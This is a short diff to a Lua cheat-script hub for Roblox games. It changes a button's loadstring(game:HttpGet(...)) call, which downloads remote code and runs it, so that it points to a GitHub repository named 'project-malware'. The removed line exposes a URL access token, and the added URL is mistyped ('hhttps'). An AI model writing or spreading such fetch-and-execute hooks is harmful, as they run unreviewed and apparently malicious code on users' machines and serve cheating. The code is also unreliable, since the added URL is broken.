@@ -6,7 +6,7 @@ local Main = Window:NewTab(" Game Script's ")
 local MainSection = Main:NewSection("Click Threee dots To Know How GX15 Works. :)")
 
             MainSection:NewButton(" Dahood  ", "Wait it for it to Pop another GUI", function(v)  
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/Rogg15/strix/main/987654321123456789?token=GHSAT0AAAAAABRJGTQZXYOEUD7CCDR5XTUEYQJZTSQ"))()
+                loadstring(game:HttpGet("hhttps://raw.githubusercontent.com/Rogg15/project-malware/main/Test"))()
             end)
 
 MainSection:NewButton(" Build a Boat", "Wait it for it to Pop another GUI", function(v)
